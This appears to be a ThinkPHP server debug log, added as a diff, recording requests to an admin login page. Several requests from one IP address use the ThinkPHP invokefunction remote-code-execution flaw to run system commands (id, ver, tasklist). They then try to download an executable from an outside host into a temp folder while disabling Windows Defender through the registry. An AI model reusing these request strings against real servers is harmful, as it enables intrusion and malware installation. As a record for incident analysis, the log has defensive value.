+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T18:29:59+08:00 ] 111.206.222.150 GET /relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546597794
+[ info ] picc.18178.net/relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546597794 [运行时间：0.109200s][吞吐率：9.16req/s] [内存消耗：2,218.20kb] [文件加载：79]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'referer' => 'http://picc.18178.net/relaxed/public/index.php/admin/index/login',
+  'accept' => '*/*',
+  'resource-type' => '3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'x-devtools-emulate-network-conditions-client-id' => '39f602a9-e56e-4909-acb9-1f2610776bf2',
+  'proxy-connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'index',
+  'v' => '1546597794',
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/ajax.php
+[ info ] [ RUN ] app\admin\controller\Ajax->lang[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Ajax.php ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T18:54:25+08:00 ] 120.92.92.251 GET /relaxed/public/index.php/admin/index/login
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124801s][吞吐率：8.01req/s] [内存消耗：2,211.92kb] [文件加载：80]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Python-urllib/2.7',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
+[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
+[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
+  0 => 'breadcrumb',
+  1 => 'site',
+  2 => 'config',
+  3 => 'auth',
+  4 => 'admin',
+  5 => 'background',
+  6 => 'title',
+) ]
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T20:30:20+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.093601s][吞吐率：10.68req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T20:30:24+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T20:30:27+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T20:30:36+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171601s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T20:30:39+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.436801s][吞吐率：2.29req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T20:33:54+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FH7PST0Y6L2.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FH7PST0Y6L2.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/H7PST0Y6L2.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T20:34:02+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FH7PST0Y6L2.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FH7PST0Y6L2.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/H7PST0Y6L2.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T21:35:58+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T21:36:02+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T21:36:05+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T21:36:08+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.156000s][吞吐率：6.41req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T21:36:10+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.436801s][吞吐率：2.29req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
